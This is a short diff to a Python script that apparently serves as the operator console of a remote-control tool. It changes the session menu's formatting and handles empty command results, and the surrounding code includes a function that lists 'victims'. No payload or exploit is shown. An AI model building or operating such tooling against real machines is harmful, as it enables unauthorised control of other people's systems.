@@ -27,8 +27,8 @@ def main():
 
             vc = ''
             while not (vc == "quit" or vc == 'q'): 
-                print("---------\n")
-                print("\nSESSION MENU")
+                print("\n------------")
+                print("SESSION MENU")
                 print("------------")
                 print("\nPossible commands:\n")
                 print("c  - command")
@@ -59,7 +59,11 @@ def main():
                 if vc.startswith('r ') or vc.startswith('result '):
                     resultid = vc.split(maxsplit = 1)[1]
                     ct,pt,rt,c,r = result(resultid)
-                    print("Timestamps:\n-----------\n\nCommand Time: {}\nPolled Time: {}\nResult Time: {}\n\nCommand:\n-----------\n\n{}\n\nResult:\n-----------\n\n{}".format(ct,pt,rt,c,r.decode("utf-8") ))
+                    if not r:
+                        r = "NONE"
+                    else:
+                        r = r.decode("utf-8")
+                    print("Timestamps:\n-----------\n\nCommand Time: {}\nPolled Time: {}\nResult Time: {}\n\nCommand:\n-----------\n\n{}\n\nResult:\n-----------\n\n{}".format(ct,pt,rt,c,r))
 
 def listvictims():
      with sqlite3.connect(DB_STRING) as c:
